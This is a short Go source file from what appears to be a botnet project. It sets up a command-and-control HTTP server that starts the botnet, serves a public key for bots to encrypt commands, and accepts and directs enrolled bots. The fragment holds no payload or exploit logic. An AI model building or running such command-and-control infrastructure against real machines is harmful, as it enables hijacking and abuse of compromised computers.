package ccserver

import (
	"log"
	"net/http"

	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/mux"
)

// NewCommandAndControlService returns a new command and control server
// wrapped in an http handler
func NewCommandAndControlService() http.Handler {
	cc, err := NewCommandAndControl()
	if err != nil {
		log.Fatalf("could not create new command and control: %s", err)
	}
	go cc.StartBotnet()

	router := mux.NewRouter()
	// exposes a public key for bots to encrypt commands before sending
	router.Methods(http.MethodGet).Path(protocol.KeyEndpoint).HandlerFunc(cc.KeyHTTPHandler)
	// accepts new bots and handles all communication to bots
	router.Methods(http.MethodGet).Path(protocol.CCEndpoint).HandlerFunc(cc.CommandAndControlHTTPHandler)

	return router
}
